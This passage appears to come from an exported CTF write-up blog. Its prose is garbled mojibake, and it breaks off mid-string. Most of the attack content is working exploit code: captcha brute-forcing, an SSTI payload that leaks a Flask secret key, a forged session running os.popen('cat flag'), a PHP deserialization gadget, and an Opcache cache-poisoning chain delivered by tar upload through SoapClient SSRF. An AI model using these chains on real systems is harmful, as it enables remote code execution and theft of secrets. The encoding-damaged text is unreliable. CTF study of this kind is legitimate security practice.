å¹¶ä¸”è®¿é—® vip, æ­¤æ—¶æ­¥è°ƒä¸€è‡´äº†ï¼Œå€˜è‹¥ç§å­ä¸€æ ·ï¼Œè¿™æ ·çš„è¯·æ±‚ä¸åˆ° 1 ç§’èƒ½å®Œæˆï¼Œä¸ä¼šæ”¹å˜æ—¶é—´æˆ³ï¼Œé‚£ä¹ˆæœ¬åœ°ç”Ÿæˆçš„ code å’Œé¢˜ç›®ä¸€æ ·ï¼Œå°±èƒ½å¤Ÿæ‹¿åˆ° vip äº† ä»Šã¯ğŸ‘´ã®å‹åˆ©ã  ã“ã‚ŒãŒğŸ‘´ã®æœ€å¾Œã®ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆï¼ 1234567891011121314151617181920212223242526272829303132333435363738394041import randomimport requestsfrom utils.captcha import Captcha,generate_codeimport timeurl1 =&quot;http://127.0.0.1:15000/&quot;url2 = &quot;http://127.0.0.1:5001/&quot;while 1: headers=&#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;, &quot;Connection&quot;:&quot;close&quot; ,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;en&quot;,&quot;Accept&quot;:&quot;*/*&quot; &#125; # timekey = int(time.time()) gen = Captcha(200, 80, int(time.time()) + random.randint(1, 100)) gen.generate() captcha = generate_code() requests.get(url1 + &quot;captcha&quot;, headers=headers) # rawBody = &quot;&#123;\\&quot;captcha\\&quot;:\\&quot;&quot;+captcha+&quot;\\&quot;&#125;&quot; json = &#123;&quot;captcha&quot;: captcha&#125; # print(&quot;json:&quot; + f&quot;&#123;json&#125;&quot;) session = requests.session() headers2 = &#123;&quot;Accept&quot;: &quot;*/*&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;en&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;&#125; cookies = &#123;&quot;session&quot;: &quot;eyJjYXB0Y2hhIjoidHBUViJ9.ZUDlMw.Iwx2YVR3CqHYbpqySJWOEJX1hac&quot;&#125; res = session.post(url1 + &quot;vip&quot;, json=json, headers=headers, cookies=cookies) try: print(res.headers[&#x27;Set-Cookie&#x27;]) break except: continue å› ä¸ºçˆ†ç ´ï¼Œå‡¹æ¦‚ç‡ï¼Œå¾ªç¯è·‘å°±è¡Œ å“ˆå“ˆå“ˆï¼ğŸ‘´ã¯ä¸€ç•ªã®å¤©æ‰ã  æœ‰ waf, é¢ç™½ã„ï¼ 123456789101112131415rule = [ [&#x27;\\\\x&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;.&#x27;,&#x27;getitem&#x27;,&#x27;print&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;getattribute&#x27;,&#x27;config&#x27;], # rule 1 [&#x27;(&#x27;,&#x27;]&#x27;,&#x27;getitem&#x27;,&#x27;_&#x27;,&#x27;%&#x27;,&#x27;print&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\\&#x27;&#x27;,&#x27;\\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;join&#x27;,&#x27;.&#x27;,&#x27;set&#x27;], # rule 2 [&#x27;\\&#x27;&#x27;,&#x27;\\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;config&#x27;,&#x27;join&#x27;,&#x27;\\\\x&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;attr&#x27;,&#x27;__&#x27;,&#x27;list&#x27;,&#x27;globals&#x27;,&#x27;.&#x27;], # rule 3 [&#x27;[&#x27;,&#x27;)&#x27;,&#x27;getitem&#x27;,&#x27;request&#x27;,&#x27;.&#x27;,&#x27;|&#x27;,&#x27;config&#x27;,&#x27;popen&#x27;,&#x27;dict&#x27;,&#x27;doc&#x27;,&#x27;\\\\x&#x27;,&#x27;_&#x27;,&#x27;\\&#123;\\&#123;&#x27;,&#x27;mro&#x27;], # rule 4 [&#x27;\\\\x&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\\&#123;\\&#123;&#x27;,&#x27;.&#x27;,&#x27;request&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;], # rule 5 [&#x27;print&#x27;, &#x27;class&#x27;, &#x27;import&#x27;, &#x27;eval&#x27;, &#x27;__&#x27;, &#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\\\\x&#x27;,&#x27;getitem&#x27;] # rule 6]def minic_waf(input): waf_seq = random.sample(range(21),3) for index in range(len(waf_seq)): waf_seq[index] = transfrom(waf_seq[index]) if not singel_waf(input, rule[waf_seq[index]]): return False return True è§„åˆ™æ¯”è¾ƒç‹¬ç‰¹ï¼Œå…­ä¸ªè§„åˆ™éšæœºç”Ÿæˆä¸‰ä¸ªï¼Œå…¶å®åªéœ€æ»¡è¶³ä¸€æ¡å°±è¡Œï¼ŒåŒæ ·æ˜¯å‡¹æ¦‚ç‡. è¿™ç§ ssti éšä¾¿æ‰“ï¼Œæ‹¿ä¸ªå¯†é’¥å…ˆ. 1234567891011121314151617181920import requestsurl1 =&quot;http://127.0.0.1:15000/&quot;data = &#123;&quot;story&quot;:&quot;&#123;&#123;config&#125;&#125;&quot;&#125;cookies = &#123;&quot;session&quot;:&quot;eyJ2aXAiOnRydWV9.ZUHlMg.eUH9ICmOx6JUujFsb8MxYu4QkOE&quot;&#125;session = requests.session()while 1: res = requests.post(url=url1+&quot;write&quot;,json=data,cookies=cookies) if &quot;success&quot; in res.text: cookie = res.headers[&#x27;Set-Cookie&#x27;].split(&quot;=&quot;)[1].split(&quot;;&quot;)[0] print(cookie) res2 = requests.get(url=url1+&quot;story&quot;,cookies = &#123;&quot;session&quot;:cookie&#125;) print(res2.text) break è¿™ç§çˆ†ç ´å¯¹ğŸ‘´æ¥è¯´è¿˜æ˜¯å¤ªç®€å•äº†ï¼Œéšéšä¾¿ä¾¿å†™ä¸ªè„šæœ¬å†²äº† æ‹¿åˆ°å¯†é’¥èƒ½å¹²å¾ˆå¤šäº‹äº†ï¼Œ 123456app.config[&#x27;SECRET_KEY&#x27;] = &#x27;6e409b39-94e4-4557-9549-961bafdebf98&#x27;@app.route(&#x27;/story&#x27;, methods=[&#x27;GET&#x27;])def session_get(): session[&#x27;story&#x27;] = &quot;&#123;&#123;url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&quot; return session[&#x27;story&#x27;] ğŸ‘´ä¸æƒ³è·‘ flasksession è„šæœ¬ï¼Œå¤ªæ‡’äº†ï¼Œè´¹åŠ²ï¼ŒğŸ˜¡,ğŸ‘´å°±ç›´æ¥åœ¨è·¯ç”±é‡Œé¢è®¾ç½®äº†. eeeeeeeeez! å…¶å®ƒç®€å•çš„é¢˜ï¼ŒğŸ‘´ä¸æƒ³åŠ¨äº†. ç»ˆäºğŸ›å®Œäº†ï¼Œå¥½ğŸ“•ğŸ‘šå•Š ã“ã‚ŒãŒå›ã®çŸ¥ã‚‰ãªã„ç‰©èª","categories":[],"tags":[{"name":"WP","slug":"WP","permalink":"https://1llustrious.github.io/tags/WP/"},{"name":"å¤ç°","slug":"å¤ç°","permalink":"https://1llustrious.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"CTF","slug":"CTF","permalink":"https://1llustrious.github.io/tags/CTF/"}]},{"title":"å…³äºDASçš„å°è®°","slug":"å…³äºDASçš„å°è®°","date":"2023-12-01T01:10:33.000Z","updated":"2023-12-02T00:51:06.422Z","comments":true,"path":"2023/12/01/å…³äºDASçš„å°è®°/","link":"","permalink":"https://1llustrious.github.io/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/","excerpt":"","text":"å†™åœ¨å‰é¢ Single_php Opcache SoapClient Ezfastjson Nomap å‚è€ƒæ–‡çŒ®ğŸ˜Š è°ƒç”¨é“¾ writeObject å†…å­˜é©¬ kali_tips å†™åœ¨å‰é¢ è¿™æ¬¡ DAS æ˜¯æˆ‘ä»¬ 0psu3 æˆå‘˜å‡ºçš„é¢˜ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ç¬¬ä¸€æ¬¡å‡ºé¢˜ç»™å„ä½å¸ˆå‚…åšï¼Œæœ‰å‡ºå¾—ä¸å¥½çš„åœ°æ–¹è¿˜å¸Œæœ›å¸ˆå‚…ä»¬è½»ç‚¹å–·ğŸ˜­ğŸ˜­ğŸ˜­. æˆ‘å‡ºçš„æ˜¯ Single_php , ä¸€å¼€å§‹åªæ˜¯æƒ³å‡ºä¸€ä¸ª Opcache æ‰©å±•æ¼æ´çš„ï¼Œé€šè¿‡æ–‡ä»¶ä¸Šä¼ åˆ° /tmp ç›®å½•ä¸‹è¦†ç›–çš„ï¼Œåæ¥åœ¨æ€è€ƒï¼Œæ€ä¹ˆç»™å¸ˆå‚…ä»¬ phpinfo, äºæ˜¯æˆ‘å°±æƒ³èµ·äº†å¯ä»¥é€šè¿‡æ•°ç»„çš„å½¢å¼è°ƒç”¨ä»»æ„æ— å‚æ–¹æ³•ï¼Œäºæ˜¯æˆ‘åˆæ”¹äº†ä¸€ä¸‹ï¼Œæ‰“ç®—é…å¥—æ•´ä¸ª SSRF, ä¼—æ‰€å‘¨çŸ¥ï¼Œè°ƒç”¨ SoapClient ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œå°±å¯ä»¥æ‰“ SSRF, é€šè¿‡ UA è¿›è¡ŒæŠ¥æ–‡ä¼ªé€ ï¼Œè€Œä¸”åˆæ¶‰åŠåˆ°æ–‡ä»¶ä¸Šä¼ ï¼Œå‹ç¼©åŒ…çš„æ•°æ®åœ¨æŠ¥æ–‡é‡Œé¢ä¸€èˆ¬éƒ½æ˜¯ä¹±ç ï¼Œä¼ªé€ èµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œäºæ˜¯æˆ‘é€šè¿‡ python å‘åŒ…ï¼Œè·å– body, äºæ˜¯å°±æœ‰äº†è¿™é“é¢˜çš„æ‰“æ³•. å¦å¤–æœ¬æ–‡ä¸­ï¼Œæˆ‘è¿˜ä¼šæ•´ä¸€ä¸ª Ezfastjson çš„å†…å®¹ï¼Œåˆ†äº«ä¸€äº›å¾®ä¸è¶³é“çš„å°çŸ¥è¯†ï¼Œè¿˜è¯·å¸ˆå‚…ä»¬æ‰‹ä¸‹ç•™æƒ…. Single_php è¿™é“é¢˜çš„æœ€ç»ˆç»“æœæ„æƒ³ä¸åˆ°ï¼Œæˆ‘é¢„è®¡éš¾åº¦ä¸­ç­‰ï¼Œæƒ³ç€å‡ ä¸ªç®€å•çš„çŸ¥è¯†ç‚¹å‡‘ä¸€å—å¯èƒ½ä¼šè¢«æ‰“çƒ‚ï¼Œä½†å®Œå…¨å‡ºä¹æ„æ–™. è¯¥é¢˜ç›®å« Single_php å®Œå…¨æ˜¯æˆ‘å¤¹å¸¦ç§è´§ï¼Œå¤šå°‘æœ‰ç‚¹ä¸ªäººæ©æ€¨äº†ğŸ˜… ?LuckyE=highlight_file è·å¾—æºç  ä¼ä¸šï¼Œæˆ‘çš„ä¼ä¸šæ–¯å“ˆæ–¯å“ˆğŸ¥µğŸ¥µğŸ¥µğŸ¥µ ä½†æ˜¯ï¼Œæˆ‘å·²ç»å•èº« 19 å¹´äº†ï¼Œè€Œèº«è¾¹çš„äººéƒ½å·²ç»è„±å•äº†ï½ï½ï¼Œæˆ‘è¦å¤ä»‡ï¼ï¼ï¼(bushi)~~ å°¤å…¶æ˜¯æŸ S å¼€å¤´çš„å¸ˆå‚…. è¿™å°±èƒ½çœ‹åˆ°æºç äº†ï¼Œæ˜¯ä¸æ˜¯å¾ˆç®€å•ğŸ˜ŠğŸ˜ŠğŸ˜Š 123456789101112&lt;?php error_reporting(0); class siroha&#123; public $koi; public function __destruct()&#123; $this-&gt;koi[&#x27;zhanjiangdiyishenqing&#x27;](); &#125; &#125; $kanozyo = $_GET[&#x27;LuckyE&#x27;](__FILE__); var_dump($kanozyo); $suki = unserialize($_POST[&#x27;suki&#x27;]); ä½ çœ‹ï¼Œæºç å°±è¿™ä¹ˆç‚¹å†…å®¹. å·²ç»èƒ½å¯¹å½“å‰æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œä¸è¿‡ä¸ºäº†é˜²æ­¢å¸ˆå‚…ä»¬ä¹±æï¼Œé˜²æ­¢ä¸€äº›å¥‡å¥‡æ€ªæ€ªéé¢„æœŸï¼Œæˆ‘å°†å½“å‰ç›®å½•è®¾ç½®ä¸ºåªè¯»äº†ğŸ¤£, çœŸä¸æ˜¯æˆ‘æ‡’. ä¿¡æ¯æœé›†æç¤ºè¿˜æœ‰ä¸ªæ–‡ä»¶ siranai.php (å¸Œè…Šå¥¶å“Ÿ) è¿™å¯æ˜¯é€šè¿‡ SSRF è§¦å‘æ–‡ä»¶ä¸Šä¼ æ¶…ğŸ¥°ğŸ¥° è½¯é“¾æ¥ï¼Ÿä¼¼ä¹ä¸è¡Œï¼Œç›®å½•ç©¿è¶Šï¼Ÿä¹Ÿä¸è¡Œï¼Œéƒ½è¯´äº†å½“å‰ç›®å½•åªè¯»ï¼Œèƒ½æ“æ§çš„åªæœ‰ /tmp ç›®å½•äº†. ä¸è¿‡æœ‰ä¸ª phpinfo, è¿˜æ˜¯è¦ç»§ç»­ä¿¡æ¯æœé›† 12345678class siroha&#123; public $koi;&#125;$a = new siroha();$a-&gt;koi = [&quot;zhanjiangdiyishenqing&quot;=&gt;&quot;phpinfo&quot;];echo urlencode(serialize($a)); å“¦ï¼Œæœ‰ä¸ªæ‰©å±•ï¼Œè¿™ä¸ªæ‰©å±•æ˜¯æœ‰æ¼æ´çš„. Opcache å…·ä½“æ¥è¯´ï¼Œå°±æ˜¯åœ¨ /tmp æŸä¸€ç‰¹å®šç›®å½•ä¸‹ï¼Œæ”¾äº†ç¼“å­˜æ–‡ä»¶ï¼Œè®¿é—® index.php çš„æ—¶å€™ï¼Œä¼šåŠ è½½è¿™ä¸ªç¼“å­˜æ–‡ä»¶ï¼Œä»è€Œå±•ç¤ºé¡µé¢. ä½†æ˜¯ï¼Œå¦‚æœç¼“å­˜æ–‡ä»¶è¢«ç¯¡æ”¹ï¼Œå°±ä¼šå˜æˆå…¶å®ƒ php ä»£ç ï¼Œè€Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯é€šè¿‡ tar æ–‡ä»¶ä¸Šä¼ ï¼Œè¦†ç›–æ‰åŸæœ¬çš„ç¼“å­˜æ–‡ä»¶ï¼Œä»è€Œå†™å…¥ä¸€å¥è¯. å®Œæˆè¿™ä¸ªåˆ©ç”¨ï¼Œéœ€è¦å‡ ä¸ªè¦ç´ : index.php çš„æœ€åçš„æ—¶é—´æˆ³ å½“å‰ php çš„ systemid. è¿™ä¸ª systemid çš„è®¡ç®—è„šæœ¬ç®€åŒ–å¦‚ä¸‹: 1sys_id = hashlib.md5(&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\\002&quot;.encode(&quot;utf-8&quot;)).hexdigest() æ ¹æ® php ç‰ˆæœ¬æ”¹å˜. ç³»ç»Ÿä¼šæ ¹æ®ç¼“å­˜æ–‡ä»¶çš„æ—¶é—´æˆ³ï¼Œåˆ¤å®šå…¶æœ‰æ•ˆæ€§ï¼Œå¦‚æœæ—¶é—´æˆ³ä¸å¯¹ï¼Œå°±ä¼šåˆ æ‰ç¼“å­˜æ–‡ä»¶å¹¶é‡æ–°ç”Ÿæˆä¸€ä»½ï¼Œäºæ˜¯æˆ‘ä»¬å°±éœ€è¦ä¼ªé€ . é‚£æ€ä¹ˆè·å–æ—¶é—´æˆ³å‘¢ï¼Œ $_GET['LuckyE'](__FILE__) é™¤äº†è·å–æºç ä¹‹å¤–ï¼Œè¿˜èƒ½å¤Ÿè·å–æ—¶é—´æˆ³. æœ¬åœ°èµ·ä¸ªç›¸åŒ php ç‰ˆæœ¬çš„ docker, å®‰è£…æ‰©å±•. 1docker-php-ext-configure opcache --enable-opcache &amp;&amp; docker-php-ext-install opcache è·å–çš„æ—¶é—´æˆ³ï¼Œè½¬ä¸ºåå…­è¿›åˆ¶ï¼Œç„¶åä¸¤ä½ä¸¤ä½çš„å€’è¿™æ”¾è¿›å» ä¹Ÿå¯ä»¥å†™ä¸ªè„šæœ¬ä¿®æ”¹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import binasciiimport hashlibimport requestsimport reimport tarfileimport subprocessimport osurl = &quot;http://43.143.192.19:1145/?LuckyE=filectime&quot;def timec(): pattern = r&quot;\\d&#123;10&#125;&quot; timeres = requests.get(url=url) match = re.search(r&#x27;int\\((\\d&#123;10&#125;)\\)&#x27;, timeres.text) # æ£€æŸ¥æ˜¯å¦æœ‰åŒ¹é… try: # æå–åŒ¹é…åˆ°çš„æ•°å­— ten_digit_number = match.group(1) print(ten_digit_number) return ten_digit_number except: print(&#x27;dame&#x27;)def split_string_into_pairs(input_string): # æ£€æŸ¥è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ if len(input_string) % 2 != 0: raise ValueError(&quot;è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦å¿…é¡»æ˜¯å¶æ•°ã€‚&quot;) # ä½¿ç”¨åˆ‡ç‰‡æ“ä½œå°†å­—ç¬¦ä¸²åˆ†å‰²æˆä¸¤ä½ä¸€ç»„çš„å­å­—ç¬¦ä¸² pairs = [input_string[i:i+2] for i in range(0, len(input_string), 2)] return pairsdef totime(time): b = split_string_into_pairs(f&quot;&#123;hex(int(time))&#125;&quot;) b.pop(0) s = &#x27;&#x27; for i in range(0, len(b)): s += b[-1] b.pop(-1) return sdef changetime(): with open(&quot;index.php.bin&quot;,&quot;rb&quot;) as file: binary_data = file.read() # å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸² hex_data = binascii.hexlify(binary_data).decode(&#x27;utf-8&#x27;) new_data = hex_data[0:128]+totime(timec())+hex_data[136:] with open(&quot;index.php.bin&quot;,&quot;wb&quot;) as f: f.write(bytes.fromhex(new_data))changetime() ä¿®æ”¹å®Œæ—¶é—´æˆ³åï¼Œå°±å¯ä»¥æ‰“åŒ… tar äº† 12345678910def tar_file(): tar_filename = &#x27;exp.tar&#x27; with tarfile.open(tar_filename,&#x27;w&#x27;) as tar: directory_info = tarfile.TarInfo(name=f&#x27;&#123;sys_id&#125;/var/www/html&#x27;) directory_info.type = tarfile.DIRTYPE directory_info.mode = 0o777 tar.addfile(directory_info) tar.add(&#x27;index.php.bin&#x27;, arcname=f&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;) è¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œè¿˜æ˜¯å†™äº†ä¸ªè„šæœ¬ã€‚è®¾ç½® 777 æƒé™ä¹Ÿæ˜¯ä¸ºäº†åœ¨ /tmp ç›®å½•ä¸‹å†™è¿›å». æœ€åå°±æ˜¯è§¦å‘ SSRF äº†ï¼Œç”±äºæ¶‰åŠåˆ° SoapClient çš„ UA æ³¨å…¥ï¼Œè€Œä¸” tar åŒ…æœ‰äºŒè¿›åˆ¶æ•°æ®ï¼Œå¤„ç†èµ·æ¥æ¯”è¾ƒéº»çƒ¦. è¿™é‡Œæˆ‘å°±ç›´æ¥é€šè¿‡ python è·å–äº†ï¼Œå¾ˆæ–¹ä¾¿ï¼ŒğŸ‘´çœŸ tmd æ˜¯ä¸ªå¤©æ‰ï¼ï¼ï¼ 12345678910111213141516171819202122def tar_file(): tar_filename = &#x27;exp.tar&#x27; with tarfile.open(tar_filename,&#x27;w&#x27;) as tar: directory_info = tarfile.TarInfo(name=f&#x27;&#123;sys_id&#125;/var/www/html&#x27;) directory_info.type = tarfile.DIRTYPE directory_info.mode = 0o777 tar.addfile(directory_info) tar.add(&#x27;index.php.bin&#x27;, arcname=f&#x27;&#123;sys_id&#125;/var/www/html/index.php.bin&#x27;)tar_file()def upload(): file = &#123;&quot;file&quot;:(&quot;exp.tar&quot;,open(&quot;exp.tar&quot;,&quot;rb&quot;).read(),&quot;application/x-tar&quot;)&#125; res = requests.post(url=url,files=file) print(res.request.headers) return res.requestrequest_content = upload()upload_body = str(request_content.body).replace(&quot;\\&quot;&quot;,&quot;\\\\\\&quot;&quot;)content_length = request_content.headers[&#x27;Content-Length&#x27;]print(content_length)print(upload_body) SoapClient 12345678910111213141516171819&lt;?phpclass siroha&#123; public $koi;&#125;$postdata = &quot;--0f9486e921f5468f9ab50745c4c93267\\r\\nContent-Disposition: form-data; name=\\&quot;file\\&quot;; filename=\\&quot;exp.tar\\&quot;\\r\\nContent-Type: application/x-tar\\r\\n\\r\\n214510e772fba140ea7a33a277f2799e/var/www/html/\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x000000777\\x000000000\\x000000000\\x0000000000000\\x0000000000000\\x00014543\\x00 5\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00ustar\\x0000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00././@PaxHeader\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x000000000\\x000000000\\x000000000\\x0000000000034\\x0000000000000\\x00010212\\x00 x\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00ustar\\x0000\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0028 mtime=1696745575.7742124\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\